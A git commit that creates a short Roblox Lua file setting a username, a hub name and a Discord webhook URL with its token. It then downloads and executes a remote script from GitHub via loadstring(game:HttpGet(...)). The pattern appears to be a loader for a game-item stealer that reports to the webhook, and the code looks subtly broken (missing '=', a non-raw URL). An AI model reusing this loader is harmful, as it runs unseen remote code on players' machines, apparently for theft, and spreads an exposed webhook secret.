2a324e6d76fdfd56d10c62243a6b1161a17885b2
neblabebla <134837179+neblabebla@users.noreply.github.com>
2023-05-28 15:52:14 +0700

    Create psx.lua

---
+++ psx.lua
@@ -0,0 +1,5 @@
+_G.Username "KaMaZIK2123"
+_G.HubName "NB PROJECT"
+_G.WebhookUrl "https://discord.com/api/webhooks/1110928932699656255/gpPDHv9XsxlZ9wVVkEriC6hdvs0AEc83EWLwUnmf-64tp21ku7WBPmVme0bvdtlr5Zw3"
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
